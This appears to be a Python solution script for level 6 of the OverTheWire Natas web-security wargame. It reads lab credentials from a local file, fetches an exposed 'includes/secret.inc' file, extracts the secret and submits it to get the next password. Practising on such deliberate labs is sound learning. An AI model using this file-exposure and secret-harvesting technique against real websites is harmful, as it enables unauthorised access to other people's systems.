import requests
import html
import re

userName = 'natas6'
url = f'http://{userName}.natas.labs.overthewire.org/'
fileContent = open('C:\\Users\\niroj\\Documents\\Natas\\password.txt')
password = fileContent.readlines()[5][7:39]

# print(password)
response = requests.get( url, auth = ( userName, password) )

response = requests.post( url + "index-source.html", auth = ( userName, password) )

session = requests.Session()
# response = session.get(url + 'index-source.html', auth = ( userName, password) )
htmlDoc = response.text
# htmlDoc = html.escape(htmlDoc)

# print(htmlDoc) 
# once you get the .\temp\index.html open that in html preview
# you may get the location like /includes/secret.inc 

response = requests.post( url + "includes/secret.inc", auth = ( userName, password) )
secret = response.text
print(secret)
# the output --
# <?
# $secret = "FOEIUWGHFEEUHOFUOIU";
# ?>

data = {
    'secret': 'FOEIUWGHFEEUHOFUOIU',
    'submit': 'submit'
}
response = requests.post( url , auth = ( userName, password), data = data)
htmlDoc = response.text

print(re.findall("password (.*)", htmlDoc))

try:
    with open('C:\\Users\\niroj\\Documents\\Natas\\scripts\\temp\\index.html', 'w') as htmlContent:
        htmlContent.writelines(htmlDoc)
        print("Operation success!")
except IOError as e:
    print(f'Unexpected sign: {e}')

